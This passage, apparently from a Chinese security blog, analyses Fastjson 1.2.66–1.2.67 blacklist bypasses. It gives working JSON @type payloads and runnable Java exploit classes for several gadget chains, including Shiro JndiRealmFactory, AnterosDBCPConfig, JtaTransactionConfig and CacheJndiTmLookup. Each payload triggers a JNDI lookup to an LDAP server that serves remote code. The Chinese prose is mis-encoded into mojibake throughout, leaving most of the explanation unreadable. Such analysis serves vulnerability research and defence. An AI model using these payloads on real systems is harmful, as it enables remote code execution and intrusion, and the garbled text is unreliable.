‡æœåŠ¡ç«¯éœ€è¦å­˜åœ¨xbean-reflectåŒ…ï¼›</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.xbean<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>xbean-reflect<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.18<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ul><p><img src="https://cdn.clown2024.cn/202408312240189.png" alt="image-20240831224018027"></p><p><strong>è°ƒè¯•åˆ†æ</strong></p><p>å…ˆæ ¹æ®payloadçœ‹ä¸€ä¸‹åˆ©ç”¨çš„ç‚¹</p><p>çœ‹ä¸€ä¸‹å…³é”®ç±»<strong>JndiConverter</strong>çš„jndiåˆ©ç”¨ç‚¹</p><p><img src="https://cdn.clown2024.cn/202409010012684.png" alt="image-20240901001248560"></p><p>é‚£å°±æ˜¯éœ€è¦æˆ‘ä»¬çš„setæ–¹æ³•èƒ½å¤Ÿè§¦å‘åˆ°è¯¥ç±»ï¼Œç„¶åçœ‹payloadå¯ä»¥çŸ¥é“æ˜¯è§¦å‘äº†ä¸€ä¸ª<strong>setAsText</strong>æ–¹æ³•ï¼Œä½†æ˜¯è¿™ä¸ªç±»æ²¡æœ‰ï¼Œé‚£å°±åº”è¯¥æ˜¯åœ¨çˆ¶ç±»é‡Œé¢ï¼Œæˆ‘ä»¬å¯ä»¥å¾€ä¸ŠæŸ¥æ‰¾è°ƒç”¨ç±»ï¼Œæœ€ç»ˆæ˜¯æ‰¾åˆ°äº†ä¸€ä¸ª<strong>AbstractConverter</strong>çš„ç±»</p><p><img src="https://cdn.clown2024.cn/202409010015651.png" alt="image-20240901001557551"></p><p><img src="https://cdn.clown2024.cn/202409010016240.png" alt="image-20240901001634139"></p><p>ä»–è¿™é‡Œè°ƒç”¨äº†toObjectæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409010017706.png" alt="image-20240901001722611"></p><p>ç„¶åè°ƒç”¨äº†toObjectImplæ–¹æ³•ï¼Œæœ€ç»ˆåˆ°æˆ‘ä»¬æ‰§è¡Œjndiçš„åœ°æ–¹</p><p>åˆ©ç”¨é“¾çš„æµç¨‹çŸ¥é“äº†ï¼Œç°åœ¨æ¥çœ‹ä¸€ä¸‹checkAutoTypeå‡½æ•°çš„æµç¨‹ï¼Œä¸»è¦æ˜¯çœ‹çœ‹ä»–æ–°å¢çš„é€»è¾‘ï¼Œè¿™é‡Œåˆ†æçš„æ˜¯å¼€å¯autoTypeSupportçš„æ—¶å€™</p><p><img src="https://cdn.clown2024.cn/202409010028755.png" alt="image-20240901002806625"></p><p>è¿™é‡Œä¼šå…ˆè¿›åˆ°ç¬¬ä¸€éƒ¨åˆ†çš„é»‘ç™½åå•åˆ¤æ–­ï¼Œç”±äºè¯¥ç±»ä¸åœ¨é»‘ç™½åå•å†…å°±ç›´æ¥å¾€ä¸‹èµ°</p><p><img src="https://cdn.clown2024.cn/202409010032724.png" alt="image-20240901003236610"></p><p>ä¸€è·¯èµ°åˆ°è¿™ä¸ªç±»ï¼Œæ­¤æ—¶clazzä¸ºnullä¸”å¼€å¯äº†autoTypeSupportï¼Œå°±ç›´æ¥loadClassï¼Œåé¢å°±æ˜¯æ­£å¸¸çš„ååºåˆ—åŒ–æµç¨‹äº†</p><p><strong>æœªå¼€å¯autoTypeSupport</strong></p><p><img src="https://cdn.clown2024.cn/202409010037003.png" alt="image-20240901003743874"></p><p>ä»–ä¼šè¿›åˆ°è¿™é‡Œçš„åˆ¤æ–­é€»è¾‘ï¼Œä¹Ÿæ˜¯æ­£å¸¸çš„é»‘ç™½åå•æ ¡éªŒç›´æ¥è¿‡å»ï¼Œä¸»è¦çš„æ˜¯ä»–ä¼šèµ°åˆ°ä¸‹é¢è¿™ä¸ªåœ°æ–¹</p><p><img src="https://cdn.clown2024.cn/202409010039269.png" alt="image-20240901003925151"></p><p>è¿™é‡Œä¼šç›´æ¥æŠ›å¼‚å¸¸æ‰€ä»¥ä¹Ÿå°±ä¸ä¼šloadClassäº†</p><h2 id="fastjson1266"><a href="#Fastjson1-2-66" class="headerlink" title="Fastjson1.2.66"></a>Fastjson1.2.66</h2><p>è¯¥ç‰ˆæœ¬ä¹Ÿæ˜¯é»‘åå•ç»•è¿‡ï¼Œ1.2.66æ¶‰åŠå¤šæ¡Gadgeté“¾ï¼ŒåŸç†éƒ½æ˜¯å­˜åœ¨JDNIæ³¨å…¥æ¼æ´ã€‚</p><p>ç»™å‡ºå„é“¾å­çš„payload</p><p>org.apache.shiro.realm.jndi.JndiRealmFactoryç±»PoCï¼š</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.shiro.realm.jndi.JndiRealmFactory&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;jndiNames&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-string">&quot;ldap://127.0.0.1:9999/xCxXLJwZ&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;Realms&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>br.com.anteros.dbcp.AnterosDBCPConfigç±»PoCï¼š</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;metricRegistry&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://127.0.0.1:9999/xCxXLJwZ&quot;</span><span class="hljs-punctuation">&#125;</span><br>æˆ–<br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;healthCheckRegistry&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://127.0.0.1:9999/xCxXLJwZ&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfigç±»PoCï¼š</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;properties&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.util.Properties&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;UserTransaction&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://127.0.0.1:9999/xCxXLJwZ&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>æ»¡è¶³æ¡ä»¶ï¼š</p><ul><li>å¼€å¯AutoTypeï¼›</li><li>Fastjson &lt;&#x3D; 1.2.66ï¼›</li><li>JNDIæ³¨å…¥åˆ©ç”¨æ‰€å—çš„JDKç‰ˆæœ¬é™åˆ¶ï¼›</li><li>org.apache.shiro.jndi.JndiObjectFactoryç±»éœ€è¦shiro-coreåŒ…ï¼›</li><li>br.com.anteros.dbcp.AnterosDBCPConfigç±»éœ€è¦Anteros-Coreå’ŒAnteros-DBCPåŒ…ï¼›</li><li>com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfigç±»éœ€è¦ibatis-sqlmapå’ŒjtaåŒ…ï¼›</li></ul><p>emmmæˆ‘è°ƒè¯•äº†ä¸€ä¸‹1.2.62çš„payloadï¼Œå‘ç°ä»–çš„åˆ¤æ–­é€»è¾‘æ²¡æœ‰ä»€ä¹ˆå˜åŒ–ï¼Œåªæ˜¯æŠŠé»‘åå•å¢åŠ äº†åº”è¯¥æ˜¯ï¼Œæ‰€ä»¥ç›´æ¥åœ¨é»‘åå•å¤„è¢«æ£€æµ‹åˆ°ç„¶åæŠ›å‡ºå¼‚å¸¸</p><p><img src="https://cdn.clown2024.cn/202409010044210.png" alt="image-20240901004414066"></p><p>æ‰€ä»¥autoTypeçš„éƒ¨åˆ†å°±ä¸åˆ†æäº†ï¼Œå°±çœ‹å„payloadçš„åˆ©ç”¨é“¾å°±å¥½</p><p><strong>org.apache.shiro.realm.jndi.JndiRealmFactory</strong></p><p>å…ˆå¯¼å…¥ä¾èµ–</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.shiro<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>shiro-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.8.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>expï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.JNDITest;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shiro_Version</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        String payload=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.shiro.realm.jndi.JndiRealmFactory\&quot;, \&quot;jndiNames\&quot;:[\&quot;ldap://127.0.0.1:9999/zoZdyoJH\&quot;], \&quot;Realms\&quot;:[\&quot;\&quot;]&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409010104683.png" alt="image-20240901010441536"></p><p>æˆ‘ä»¬ç›´æ¥å»çœ‹ä¸€ä¸‹<strong>JndiRealmFactory</strong>è¿™ä¸ªç±»ï¼Œå‘ç°ä»–çš„getRealmsæ–¹æ³•å­˜åœ¨JNDIæ³¨å…¥</p><p><img src="https://cdn.clown2024.cn/202409010113706.png" alt="image-20240901011300563"></p><p>ç„¶åæ˜¯éå†jndiNamesæ¥ä¼ å…¥å‚æ•°ï¼Œæ‰€ä»¥è¿™é‡Œpayloadè®¾ç½®ä¸€ä¸ªjndiNamesæ•°ç»„</p><p>getæ–¹æ³•è°ƒç”¨ï¼š</p><p>è‡³äºè¿™é‡Œä¸ºä»€ä¹ˆè°ƒç”¨getè€Œä¸æ˜¯setï¼Œä¹Ÿè¡¥å……ä¸€ä¸‹å‰é¢æ²¡æœ‰æåˆ°è¿™ä¸ª</p><p>è¿˜è®°å¾—å‰é¢æœ‰å¯¹å„ç§æ–¹æ³•å’Œå­—æ®µéå†çš„JavaBeanInfoçš„å°è£…å§</p><p><img src="https://cdn.clown2024.cn/202409010144471.png" alt="image-20240901014448343"></p><p>è¿™ä¸ªç‰ˆæœ¬è™½ç„¶æ”¹äº†ä¸€ç‚¹ï¼Œä½†ä¸å½±å“ç›®å‰çš„åˆ†æï¼Œè¿™ä¸ªç®­å¤´æ‰€æŒ‡çš„å°±æ˜¯åœ¨éå†ç±»çš„getæ–¹æ³•ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹æ‰§è¡Œäº†ä»€ä¹ˆæ“ä½œ</p><p><img src="https://cdn.clown2024.cn/202409010150192.png" alt="image-20240901015008065"></p><p>è¿™é‡Œå¯¹è¿”å›å€¼çš„ç±»å‹è¿›è¡Œäº†åˆ¤æ–­ï¼Œå¦‚æœä¸ºç¬¦åˆçš„ç±»å‹è¿›åˆ°é€»è¾‘é‡Œé¢ï¼Œæˆ‘ä»¬è¿™é‡Œä¼ çš„æ˜¯[]ä¸”getæ–¹æ³•è¿”å›å€¼ä¸ºCollectionç¬¦åˆè¿”å›å€¼ä¸ºCollectionçš„æƒ…å†µæ‰€ä»¥ä¼šç»§ç»­å¾€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202409010210700.png" alt="image-20240901021056578"></p><p>ç„¶åå¦‚æœç±»é‡Œé¢æ²¡æœ‰setæ–¹æ³•å°±ä¼šèµ°åˆ°è¿™é‡Œéå†getæ–¹æ³•çš„è¿™ä¸€æ­¥ï¼Œä¸ç„¶å°±ä¼šè¿›å…¥åˆ°ä¸Šä¸€æ­¥çš„continueï¼Œå› ä¸ºå‰é¢çš„ä¸€ä¸ªéå†methodæ˜¯ä¼˜å…ˆsetæ–¹æ³•ï¼Œæœ€ååŒæ ·æ˜¯addè¿›äº†fieldList</p><p>ç„¶åè·Ÿè¿›å»newFieldInfoé‡Œé¢ï¼Œè¿™é‡Œè¦æ³¨æ„ä¸€ä¸ªé‡è¦çš„å±æ€§<strong>getOnly</strong></p><p><img src="https://cdn.clown2024.cn/202409010215166.png" alt="image-20240901021533021"></p><p>åœ¨è¿™é‡Œé¢å°†getOnlyèµ‹å€¼ä¸ºäº†true</p><p>ç„¶åä¸€è·¯è·Ÿè¿›æœ€åä¼šè¿›åˆ°è¿™ä¸ªæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409010221406.png" alt="image-20240901022101254"></p><p>æ­¤æ—¶getOnlyå·²ç»ä¸ºtrueï¼Œç»§ç»­å¾€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202409010221503.png" alt="image-20240901022129364"></p><p>æœ€ç»ˆèµ°åˆ°è¿™æ‰§è¡Œäº†getæ–¹æ³•</p><p>æ‰€ä»¥æ€»ç»“æ‰§è¡Œgetæ–¹æ³•çš„æ¡ä»¶(ä¸è¿‡ä¸»è¦æ˜¯é’ˆå¯¹ç”¨äº†parseæ–¹æ³•è€Œæ²¡ç”¨parseObjectï¼Œå› ä¸ºparseObjectæœ¬èº«å°±ä¼šè¿getä¸€èµ·æ‰§è¡Œ)ï¼š</p><p>parseä»–ä¼šå»ä¼˜å…ˆå»åŒ¹é…è°ƒç”¨å­—æ®µçš„setæ–¹æ³•ï¼Œå¦‚æœæ²¡æœ‰setæ–¹æ³•ï¼Œå°±ä¼šå»å¯»æ‰¾å­—æ®µçš„getæ–¹æ³•ä¸”è¿”å›å€¼è¦æ˜¯Collection|Map|AtomicBoolean|AtomicInteger|AtomicLong</p><blockquote><p>æ‰€ä»¥å‰é¢å¯èƒ½å†™çš„æœ‰ç‚¹ä¹±ï¼Œå› ä¸ºå†™åˆ°è¿™æ‰çœŸæ­£è°ƒä¼šgetå’Œsetçš„è°ƒç”¨ğŸ˜¢</p></blockquote><p><strong>br.com.anteros.dbcp.AnterosDBCPConfig</strong></p><p>å¯¼å…¥ä¾èµ–ï¼š</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/br.com.anteros/Anteros-Core --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>br.com.anteros<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>Anteros-Core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/br.com.anteros/Anteros-DBCP --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>br.com.anteros<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>Anteros-DBCP<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>expï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.JNDITest;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Anteros_Version</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        String payload1=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;br.com.anteros.dbcp.AnterosDBCPConfig\&quot;,\&quot;metricRegistry\&quot;:\&quot;ldap://127.0.0.1:9999/xCxXLJwZ\&quot;&#125;&quot;</span>;<br>        String payload2=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;br.com.anteros.dbcp.AnterosDBCPConfig\&quot;,\&quot;healthCheckRegistry\&quot;:\&quot;ldap://127.0.0.1:9999/xCxXLJwZ\&quot;&#125;&quot;</span>;<br>        JSON.parse(payload1);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>payload1åˆ†æ</strong></p><p>è°ƒç”¨AnterosDBCPConfig#setMetricRegistry</p><p><img src="https://cdn.clown2024.cn/202409011042417.png" alt="image-20240901104216255"></p><p>ç„¶åè°ƒç”¨AnterosDBCPConfig#getObjectOrPerformJndiLookup</p><p><img src="https://cdn.clown2024.cn/202409011043947.png" alt="image-20240901104316840"></p><p>è¿™é‡Œå­˜åœ¨jndiæ³¨å…¥æ¼æ´</p><p><strong>payload2åˆ†æ</strong></p><p>è°ƒç”¨AnterosDBCPConfig#setHealthCheckRegistry</p><p><img src="https://cdn.clown2024.cn/202409011044736.png" alt="image-20240901104447626"></p><p>è°ƒç”¨AnterosDBCPConfig#getObjectOrPerformJndiLookup</p><p><img src="https://cdn.clown2024.cn/202409011045210.png" alt="image-20240901104535103"></p><p>è¿™é‡Œå­˜åœ¨jndiæ³¨å…¥æ¼æ´</p><blockquote><p>è¿™ä¸ªAnterosçœ‹mavenä»“åº“ç”¨çš„äººå¥½å°‘ï¼Œæ„Ÿè§‰æ¯”è¾ƒéš¾ç¢°åˆ°</p></blockquote><p><strong>com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig</strong></p><p>å¯¼å…¥ä¾èµ–</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.ibatis/ibatis-sqlmap --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.ibatis<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>ibatis-sqlmap<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.3.4.726<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/javax.transaction/jta --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.transaction<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jta<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>expï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.JNDITest;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JTA_Version</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        String payload=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\&quot;,\&quot;properties\&quot;: &#123;\&quot;@type\&quot;:\&quot;java.util.Properties\&quot;,\&quot;UserTransaction\&quot;:\&quot;ldap://127.0.0.1:9999/xCxXLJwZ\&quot;&#125;&#125;&quot;</span>;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409011109175.png" alt="image-20240901110919034"></p><p>åˆ©ç”¨é“¾åˆ†æ</p><p>é¦–å…ˆè°ƒç”¨åˆ°JtaTransactionConfig#setPropertiesæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409011111348.png" alt="image-20240901111125227"></p><p>è¿™é‡Œå­˜åœ¨jndiæ¼æ´ï¼Œä½†æ˜¯utxNameè·å–ä¸ºå›ºå®šçš„é”®å€¼ï¼Œä¸ºPropertieså¯¹è±¡çš„UserTransaction</p><p>æ‰€ä»¥payloadé‡Œçš„propertieså€¼çš„è®¾ç½®ä¸ºPropertiesç±»ç„¶ååŠ ä¸€ä¸ªUserTransactionå±æ€§</p><h2 id="fastjson1267"><a href="#Fastjson1-2-67" class="headerlink" title="Fastjson1.2.67"></a>Fastjson1.2.67</h2><p>ä¹Ÿæ˜¯é»‘åå•ç»•è¿‡ï¼Œç›´æ¥ç»™payloadï¼Œä¸æƒ³åˆ†æäº†ï¼ˆ</p><p>è¿™é‡Œçš„æ¡ä»¶ä¹Ÿæ˜¯å¼€å¯autoType</p><p><strong>org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup</strong></p><p>éœ€è¦ignite-coreã€ignite-jtaå’Œjtaä¾èµ–</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&quot;@type&quot;:&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;, &quot;jndiNames&quot;:[&quot;ldap://127.0.0.1:9999/xCxXLJwZ&quot;], &quot;tm&quot;: &#123;&quot;$ref&quot;:&quot;$.tm&quot;&#125;&#125;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.ignite/ignite-jta --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.ignite<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>ignite-jta<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.9.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.transaction<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jta<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.ignite/ignite-core --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.ignite<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>ignite-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.8.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ä»£ç ç¤ºä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.JNDITest;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">liuqi_banben</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        String payload=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\&quot;, \&quot;jndiNames\&quot;:[\&quot;ldap://127.0.0.1:9999/BXcEBBgx\&quot;], \&quot;tm\&quot;: &#123;\&quot;$ref\&quot;:\&quot;$.tm\&quot;&#125;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409031930659.png" alt="image-20240903193000515"></p><p>åˆ©ç”¨é“¾åˆ†æï¼š</p><p>æ ¹æ®pocæ¥çœ‹çœ‹æ¼æ´ç‚¹</p><p><img src="https://cdn.clown2024.cn/202409031938377.png" alt="image-20240903193814261"></p><p><img src="https://cdn.clown2024.cn/202409031938851.png" alt="image-20240903193827745"></p><p>æ‰€ä»¥å°±æ˜¯ä»jndiNameséå†ï¼Œç„¶ååœ¨getTmæ–¹æ³•ä¸­è§¦å‘jndiæ¼æ´ï¼Œè¿™é‡Œçš„tmå±æ€§åªæœ‰getæ–¹æ³•</p><p>ä½†æ˜¯æ ¹æ®ä»–çš„è¿”å›å€¼çœ‹èµ·æ¥å¹¶ä¸æ»¡è¶³æˆ‘ä»¬å‰é¢è¯´çš„è§¦å‘getæ–¹æ³•çš„ç‰¹å¾ï¼Œè¿™é‡Œå°±æ¶‰åŠåˆ°Fastjsonçš„å¾ªç¯å¼•ç”¨</p><p><strong>å¾ªç¯å¼•ç”¨</strong></p><p><a 